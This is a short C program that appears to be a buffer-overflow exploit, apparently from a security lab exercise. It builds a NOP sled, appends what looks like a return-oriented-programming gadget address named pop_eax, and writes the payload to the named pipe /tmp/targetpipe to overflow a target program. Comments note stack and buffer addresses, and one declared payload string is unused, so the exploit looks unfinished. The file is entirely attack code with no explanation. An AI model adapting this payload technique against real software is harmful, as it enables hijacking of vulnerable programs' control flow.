#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[140];
  char trap[] = "\xe5\xb6\xa9\xbb";
  char pop_eax[] = "\xe1\xa0\xb9\xbb\x01\x01\x01\x3b";
  int i;
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x90",1);
  
  strcpy(bufr + 131, pop_eax);
  //strcpy(bufr + 136, "");
  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf57d8 -> 08048be8
// buf: 0xbfbf57e5